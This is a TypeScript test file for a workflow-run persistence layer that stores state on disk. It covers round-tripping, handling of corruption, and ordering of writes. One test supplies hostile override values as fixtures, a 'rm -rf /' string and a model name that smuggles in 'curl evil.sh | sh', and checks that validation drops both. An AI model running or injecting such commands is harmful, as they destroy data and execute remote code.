// The on-disk workflow-run mirror (~/.lattice/per-project/<hash>/workflow-runs.json)
// that lets a running run survive a backend restart (the regression story:
// workflowRunResume.restore.test.ts). It round-trips and drops unresumable
// records, re-validates persisted overrides (they reach a spawn command),
// clears when nothing runs and never throws on corruption, is kept current by
// every run-carrying `notify`, and serializes its writes: a slow mirror write
// cannot resurrect a finished run, and a flush waits for a write already
// handed to the filesystem. Shared fixture: helpers/workflowRunResume.ts.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';
import { canonicalProjectPath } from '../projectPath.js';
import { notify, runs } from '../workflowRuns/state.js';
import {
  deserializeWorkflowRuns,
  flushWorkflowRunPersist,
  loadPersistedWorkflowRuns,
  serializeWorkflowRuns,
  workflowRunsFile,
  writeWorkflowRunsNow,
} from '../workflowRuns/persistence.js';
import { fakeRun } from './helpers/workflowRunResume.js';

test('workflow-run (de)serialization round-trips and drops unresumable records', () => {
  const run = fakeRun({ harnessOverride: 'pi', piModelOverride: 'openai/gpt-x' });
  const parsed = deserializeWorkflowRuns(JSON.parse(serializeWorkflowRuns([run])));
  assert.deepEqual(parsed, [run]);

  // Only `running` runs are resumable — a finished one has nothing to resume.
  assert.deepEqual(
    deserializeWorkflowRuns({ version: 1, runs: [fakeRun({ status: 'completed' })] }),
    [],
  );
  // Structurally broken records are dropped individually, not fatally.
  assert.deepEqual(
    deserializeWorkflowRuns({
      version: 1,
      runs: [null, 'nope', { id: 'x' }, { ...run, currentStepIndex: -1 }, run],
    }).map((r) => r.id),
    [run.id],
  );
  assert.deepEqual(deserializeWorkflowRuns(undefined), []);
});

test('persisted overrides are re-validated on the way back in (they reach a spawn command)', () => {
  // The mirror is a file on disk: stale, hand-editable, corruptible. Both
  // override fields end up in a harness command, so a bad value must be
  // dropped at this boundary rather than trusted from JSON.
  const [parsed] = deserializeWorkflowRuns({
    version: 1,
    runs: [
      {
        ...fakeRun(),
        harnessOverride: 'rm -rf /',
        piModelOverride: 'openai/gpt-x"; curl evil.sh | sh; #',
      },
    ],
  });
  assert.ok(parsed);
  assert.equal(parsed.harnessOverride, undefined, 'a non-harness value is dropped');
  assert.equal(parsed.piModelOverride, undefined, 'a shell-injecting model is dropped');
});

test('the mirror survives a write/read cycle, clears when nothing runs, and never throws on corruption', async () => {
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfpersist-'));
  try {
    const run = fakeRun({ id: 'wfrun_disk', projectPath: canonicalProjectPath(project) });

    assert.deepEqual(await loadPersistedWorkflowRuns(project), [], 'no file yet → no runs');

    await writeWorkflowRunsNow(project, [run]);
    assert.deepEqual(await loadPersistedWorkflowRuns(project), [run]);

    // A corrupt mirror must degrade to "nothing to resume" rather than throw
    // into boot recovery and abort every later startup phase.
    await fs.writeFile(workflowRunsFile(project), '{"version":1,"runs":[', 'utf8');
    assert.deepEqual(await loadPersistedWorkflowRuns(project), []);

    // No running runs → the file is removed, so boot recovery isn't opening an
    // empty husk for every project that ever ran a workflow.
    await writeWorkflowRunsNow(project, [run]);
    await writeWorkflowRunsNow(project, []);
    await assert.rejects(fs.access(workflowRunsFile(project)));
  } finally {
    await fs.rm(project, { recursive: true, force: true });
  }
});

test('a run-carrying WS event mirrors the project\'s running runs to disk', async () => {
  // The persistence hook lives in `notify`, so every lifecycle event a run
  // emits keeps the mirror current — if it regresses, a restart loses the run
  // again even though the file exists.
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfnotify-'));
  const canonical = canonicalProjectPath(project);
  const run = fakeRun({ id: 'wfrun_notify', projectPath: canonical });
  try {
    runs.set(run.id, run);
    notify({ type: 'progress', run: { ...run } });
    await flushWorkflowRunPersist(canonical);
    assert.deepEqual(
      (await loadPersistedWorkflowRuns(canonical)).map((r) => r.id),
      [run.id],
    );

    // Finishing the run clears it from the mirror — a completed run must not be
    // resurrected as "running" by the next boot.
    run.status = 'completed';
    notify({ type: 'completed', run: { ...run } });
    await flushWorkflowRunPersist(canonical);
    assert.deepEqual(await loadPersistedWorkflowRuns(canonical), []);
  } finally {
    runs.delete(run.id);
    await fs.rm(project, { recursive: true, force: true });
  }
});

test('a slow workflow mirror write cannot resurrect a finished run', async (t) => {
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfwrite-order-'));
  const file = workflowRunsFile(project);
  const rename = fs.rename;
  let reachedRename!: () => void;
  const atRename = new Promise<void>((resolve) => { reachedRename = resolve; });
  let releaseRename!: () => void;
  const blockedRename = new Promise<void>((resolve) => { releaseRename = resolve; });
  const renameMock = t.mock.method(fs, 'rename', async (...args: Parameters<typeof fs.rename>) => {
    if (String(args[1]) === file) {
      reachedRename();
      await blockedRename;
    }
    return rename(...args);
  });
  let first: Promise<void> | undefined;
  let second: Promise<void> | undefined;
  try {
    first = writeWorkflowRunsNow(project, [fakeRun({ projectPath: canonicalProjectPath(project) })]);
    await atRename;
    second = writeWorkflowRunsNow(project, []);
    // Give the completion-state operation time to overtake the older rename.
    // The fixed implementation queues it behind the first write instead.
    await new Promise((resolve) => setTimeout(resolve, 25));
    releaseRename();
    await Promise.all([first, second]);
    assert.deepEqual(await loadPersistedWorkflowRuns(project), []);
  } finally {
    releaseRename();
    await Promise.all([first, second]);
    renameMock.mock.restore();
    await fs.rm(project, { recursive: true, force: true });
  }
});

test('flushing workflow persistence waits for a write already handed to the filesystem', async (t) => {
  const project = await fs.mkdtemp(path.join(os.tmpdir(), 'lattice-wfflush-order-'));
  const file = workflowRunsFile(project);
  const rename = fs.rename;
  let reachedRename!: () => void;
  const atRename = new Promise<void>((resolve) => { reachedRename = resolve; });
  let releaseRename!: () => void;
  const blockedRename = new Promise<void>((resolve) => { releaseRename = resolve; });
  const renameMock = t.mock.method(fs, 'rename', async (...args: Parameters<typeof fs.rename>) => {
    if (String(args[1]) === file) {
      reachedRename();
      await blockedRename;
    }
    return rename(...args);
  });
  const writing = writeWorkflowRunsNow(project, [fakeRun({ projectPath: canonicalProjectPath(project) })]);
  try {
    await atRename;
    let flushed = false;
    const flushing = flushWorkflowRunPersist(project).then(() => { flushed = true; });
    await new Promise((resolve) => setTimeout(resolve, 10));
    assert.equal(flushed, false, 'flush must not finish while the mirror is uncommitted');
    releaseRename();
    await flushing;
  } finally {
    releaseRename();
    await writing;
    renameMock.mock.restore();
    await writeWorkflowRunsNow(project, []);
    await fs.rm(project, { recursive: true, force: true });
  }
});
